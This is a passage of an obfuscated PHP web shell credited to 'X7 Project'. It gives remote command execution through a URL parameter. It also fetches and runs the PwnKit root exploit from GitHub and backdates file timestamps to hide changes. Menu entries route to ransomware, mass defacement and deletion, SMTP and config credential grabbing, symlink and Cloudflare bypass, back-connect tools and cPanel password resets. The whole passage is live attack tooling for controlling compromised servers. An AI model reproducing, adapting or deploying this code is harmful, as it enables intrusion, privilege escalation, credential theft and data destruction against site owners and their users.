	</tr>
	<tr>
	<td>Software</td>
	<td>: '.$IIIIIIII1Ill.'</td>
	</tr>
	<tr>
	<td>Sistem Operasi</td>
	<td> : '.$IIIIIIIIl111.'</td>
	</tr>
	</table>
	</div>
	</div><hr/>
	</div>
	<div class="col-md-7 mt-4">';
if (isset($_GET['keluar'])){
session_start();
session_destroy();
echo '<script>window.location="?";</script>';
}
if(isset($_GET['cmd'])){
echo "<pre class='text-white'>".IIIIIIIII1lI($_GET['cmd']).'</pre>';
exit;
}
if(isset($_GET['rootnya'])){
$IIIIIIlllI11 = $_GET['rootnya'];
IIIIIIIII1lI('curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o kangrut;chmod +x kangrut');
echo "<pre class='text-white'>".IIIIIIIII1lI("./kangrut '$IIIIIIlllI11'").'</pre>';
IIIIIIIII1lI('rm -rf kangrut');
exit;
}
if(isset($_GET['changedatenya'])){
$IIIIIIlllI11 = $_GET['changedatenya'];
echo "<pre class='text-white'>".IIIIIIIII1lI("ls '$IIIIIIlllI11' > date.txt").'</pre>';
IIIIIIIII1lI('for i in $(cat date.txt);do touch -mt $(echo 201$(shuf -i0-12 -n1)0$(shuf -i0-12 -n1)0$(shuf -i0-12 -n1)0000) '.$_GET['changedatenya'].'/$i;done');
echo "<p class='text-white'>[+] Done Modified<br>[*] Tools Not Work ? <a href='?dir=".$dir."&aksi=ngebepass'>Bypass it</a></p></div></div>";
IIIIIIIII1lI('rm -rf date.txt');
exit;
}
if(isset($_GET['ngebepassnya'])){
$IIIIIIlllI11 = $_GET['ngebepassnya'];
echo "<pre class='text-white'>".IIIIIIIII1lI("ls '$IIIIIIlllI11' > date.txt").'</pre>';
IIIIIIIII1lI('for i in $(cat date.txt);do touch -mt $(echo 201$((RANDOM%10))0$((RANDOM%10))0$((RANDOM%10))0000) '.$_GET['ngebepassnya'].'/$i;done');
echo "<p class='text-white'>[+] Done Modified</p></div></div>";
IIIIIIIII1lI('rm -rf date.txt');
exit;
}
if (isset($_GET['about'])){
about();
}
if ($_GET['aksi'] == 'upload'){
IIIIIIIllIll($dir);
}
if ($_GET['aksi'] == 'ngebepass'){
IIIIIIIlI11I($dir);
}
if ($_GET['aksi'] == 'crontab'){
IIIIIIIlI1Il($dir);
}
if ($_GET['aksi'] == 'terminalroot'){
IIIIIIIlI1lI($dir);
}
if ($_GET['aksi'] == 'changedate'){
IIIIIIIlI1ll($dir);
}
if ($_GET['aksi'] == 'ngeroot'){
IIIIIIIllII1($dir);
}
if (isset($_GET['file'])){
$file = $_GET['file'];
}
$IIIIIIIlllIl = basename($file);
if($_GET['aksi'] == 'chmod_file'){
IIIIIIIlllII($dir,$file,$IIIIIIIlllIl);
}
if ($_GET['aksi'] == 'buat_file'){
IIIIIIIlllll($dir,$IIIIIIII1l1l);
}
if($_GET['aksi'] == 'view'){
view($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l);
}
if($_GET['aksi'] == 'edit'){
IIIIIIIll1lI($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l);
}
if($_GET['aksi'] == 'rename'){
IIIIIIIll11I($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l);
}
if ($_GET['aksi'] == 'hapusf'){
IIIIIIIl1IIl($dir,$file,$IIIIIIIlllIl);
}
$IIIIIIIl1Ill = basename($dir);
if($_GET['aksi'] == 'chmod_dir'){
IIIIIIIl1IlI($dir,$IIIIIIIl1Ill);
}
if ($_GET['aksi'] == 'buat_folder'){
IIIIIIIl1Il1($dir,$IIIIIIII1l1I);
}
if ($_GET['aksi'] == 'rename_folder'){
IIIIIIIl1lI1($dir,$IIIIIIIl1Ill,$IIIIIIII1l1I);
}
if ($_GET['aksi'] == 'hapus_folder'){
IIIIIIIl1ll1($dir,$IIIIIIIl1Ill);
}
if($_GET['aksi'] == 'masdef'){
IIIIIIIl1l11($dir,$file,$IIIIIIII1l1I,$IIIIIIII1l1l);
}
if($_GET['aksi'] == 'masdel'){
IIIIIII1IIII($dir,$file,$IIIIIIII1l1I,$IIIIIIII1l1l);
}
if($_GET['aksi'] == 'jumping'){
IIIIIII1IIlI($dir,$file,$IIIIIIII1III);
}
if($_GET['aksi'] == 'config'){
IIIIIII1lII1($dir,$file);
}
if($_GET['aksi'] == 'passwbypass'){
IIIIIII1lll1($dir,$file);
}
if($_GET['aksi'] == 'adminer'){
IIIIIII1l1lI($dir,$file);
}
if($_GET['aksi'] == 'symlink'){
IIIIIII1l1l1($dir,$file);
}
if($_GET['aksi'] == 'symread'){
IIIIIII11lI1($dir,$file);
}
if ($_GET['aksi'] == 'sym_404'){
IIIIIII111ll($dir,$file);
}
if ($_GET['aksi'] == 'sym_bypas'){
IIIIIIlIIIII($dir,$file);
}
if($_GET['aksi'] == 'bctools'){
IIIIIIlIIIll($dir,$file);
}
if($_GET['aksi'] == 'disabfunc'){
disabFunc($dir,$file);
}
if ($_GET['aksi'] == 'resetpasscp'){
IIIIIIlIlI1I($dir);
}
if($_GET['aksi'] == 'auteduser'){
IIIIIIlIlllI($dir,$file);
}
if ($_GET['aksi'] == 'ransom'){
ransom($dir,$file);
}
if ($_GET['aksi'] == 'smtpgrab'){
IIIIIIllII11($dir);
}
if ($_GET['aksi'] == 'bypascf'){
IIIIIIllIl11();
}
if($_GET['aksi'] == 'zip_menu'){
IIIIIIllI1lI($dir,$file);
}
if(isset($_GET['path'])){
$path = $_GET['path'];
chdir($path);
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$IIIIIIIIl1l1 = explode('/',$path);
echo 'Path : ';
foreach($IIIIIIIIl1l1 as $id=>$IIIIIIllllII){
if($IIIIIIllllII == ''&&$id == 0){
$IIIIIIllllIl = true;
echo '<a href="?dir=/">/</a>';
continue;
}
if($IIIIIIllllII == '') continue;
echo '<a style="word-wrap:break-word;" href="?dir=';
for($IIIIIIII11I1=0;$IIIIIIII11I1<=$id;$IIIIIIII11I1++){
echo "$IIIIIIIIl1l1[$IIIIIIII11I1]";
if($IIIIIIII11I1 != $id) echo '/';
}
echo '">'.$IIIIIIllllII.'</a>/';
}
$IIIIIIllllI1 = scandir($path);
echo '&nbsp;&nbsp;[ '.w($dir,IIIIIIIIl1II($dir)).' ]';
echo '<div id="tab"><table class="text-white mt-1 table-hover table-responsive">
					<thead class="bg-info text-center">
					<th class="text-left">File/folder</th>
					<th>Size</th>
					<th>Last Modified</th>
					<th>Permission</th>
					<th>Action</th>
					</thead>';
foreach($IIIIIIllllI1 as $dir){
$IIIIIIlllllI = date('d/m/y G:i',filemtime("$dir/$IIIIIIllll1I"));
if (strlen($dir) >18){
$IIIIIIllll1l = substr($dir,0,18).'...';
}else{
$IIIIIIllll1l = $dir;
}
$IIIIIIllll11 = $IIIIIIllll1l;
if(!is_dir($path.'/'.$dir) ||$dir == '.'||$dir == '..') continue;
echo '<tr class="text-center">
						<td class="pinggir">'.$IIIIIIII1l1I.' <a href="?dir='.$path.'/'.$dir.'">'.$IIIIIIllll11.'</a></td>
						<td>--</td>
						<td>'.$IIIIIIlllllI.'</td>
						<td>
						<a href="?dir='.$path.'/'.$dir.'&aksi=chmod_dir">
						';
if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo IIIIIIIIl1II($path.'/'.$dir);
if(is_writable($path.'/'.$dir) ||!is_readable($path.'/'.$dir)) echo '</font></a></td>
						<td><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
						</td>
						</tr>';
}
foreach($IIIIIIllllI1 as $file){
$IIIIIIlll1II = date('d/m/y G:i',filemtime("$path/$file"));
if(!is_file($path.'/'.$file)) continue;
echo '<tr class="text-center">
						<td class="pinggir"><img src="';
$IIIIIIlll1Il = strtolower(pathinfo($file,PATHINFO_EXTENSION));
if($IIIIIIlll1Il == 'php'){
echo 'https://a.top4top.io/p_2381dmsrl0.png';
}elseif ($IIIIIIlll1Il == 'html'){
echo 'https://l.top4top.io/p_2381sddi40.png"';
}elseif ($IIIIIIlll1Il == 'css'){
echo 'https://c.top4top.io/p_23814mg1j9.png"';
}elseif ($IIIIIIlll1Il == 'png'){
echo 'https://l.top4top.io/p_2381tbs2o0.png"';
}elseif ($IIIIIIlll1Il == 'jpg'){
echo 'https://c.top4top.io/p_2381gzrcw0.png"';
}elseif ($IIIIIIlll1Il == 'jpeg'){
echo 'https://g.top4top.io/p_2381u66jv1.png"';
}elseif($IIIIIIlll1Il == 'zip'){
echo 'https://d.top4top.io/p_238170r2f1.png"';
}elseif ($IIIIIIlll1Il == 'js'){
echo 'https://k.top4top.io/p_23812masf0.png';
}elseif ($IIIIIIlll1Il == 'ttf'){
echo 'https://b.top4top.io/p_2381iabrb0.png';
}elseif ($IIIIIIlll1Il == 'rar'){
echo 'https://e.top4top.io/p_2381gykpl2.png';
}elseif ($IIIIIIlll1Il == 'txt'){
echo 'https://e.top4top.io/p_2381ao1nb2.png';
}elseif ($IIIIIIlll1Il == 'ico'){
echo 'https://i.top4top.io/p_23819g9ve3.png';
}elseif ($IIIIIIlll1Il == 'conf'){
echo 'https://g.top4top.io/p_23817zhmm0.png';
}elseif ($IIIIIIlll1Il == 'htaccess'){
echo 'https://b.top4top.io/p_2381hl43t0.png';
}elseif ($IIIIIIlll1Il == 'sh'){
echo 'https://i.top4top.io/p_2381bynyv0.png';
}elseif ($IIIIIIlll1Il == 'py'){
echo 'https://i.top4top.io/p_2381ggi2t0.png';
}elseif ($IIIIIIlll1Il == 'indsc'){
echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
}elseif ($IIIIIIlll1Il == 'sql'){
echo 'https://e.top4top.io/p_2381qn4hx2.png';
}elseif ($IIIIIIlll1Il == 'pl'){
echo 'http://i.imgur.com/PnmX8H9.png';
}elseif ($IIIIIIlll1Il == 'pdf'){
echo 'https://c.top4top.io/p_2381o8a4a0.png';
}elseif ($IIIIIIlll1Il == 'mp4'){
echo 'https://g.top4top.io/p_2381ho9zk0.png';
}elseif ($IIIIIIlll1Il == 'mp3'){
echo 'https://h.top4top.io/p_2381yliwa1.png';
}elseif ($IIIIIIlll1Il == 'git'){
echo 'https://d.top4top.io/p_2381utuc11.png';
}elseif ($IIIIIIlll1Il == 'md'){
echo 'https://c.top4top.io/p_23813jpkc0.png';
}else{
echo 'https://g.top4top.io/p_23817zhmm0.png';
}
echo '" class="ico2"></img>';
if (strlen($file) >25){
$IIIIIIlll1lI = substr($file,0,25).'...-.'.$IIIIIIlll1Il;
}else{
$IIIIIIlll1lI = $file;
}
echo' <a href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">'.$IIIIIIlll1lI.'</a></td>
						<td>'.IIIIIIII1l11(filesize($file)).'</td>
						<td>'.$IIIIIIlll1II.'</td>
						<td><a href="?dir='.$path.'&aksi=chmod_file&file='.$path.'/'.$file.'" class="text-center">';
if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo IIIIIIIIl1II($path.'/'.$file);
if(is_writable($path.'/'.$file) ||!is_readable($path.'/'.$file)) echo '</font></a></td>
						<td class="d-flex">
						<a title="Lihat" class="badge badge-info" href="?dir='.$path.'&aksi=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Edit" class="badge badge-success" href="?dir='.$path.'&aksi=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Rename" class="badge badge-success" href="?dir='.$path.'&aksi=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Delete" class="badge badge-danger" href="?dir='.$path.'&aksi=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Download" class="badge badge-primary" href="?&dir='.$path.'&aksi=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
						</td>
						</tr>';
}
echo '</table></div><hr/>
					<center><a class="text-muted" href="https://facebook.com/IndoSecOfficial">Copyright 2022 { X7 Project }</a></center><br/>';
echo "<a href='#' class='scrollToTop'><i class='fa fa-arrow-up up' aria-hidden='true'></i></a>";;echo '				</div>
			</div>
		</body>
		</html>';; ?>
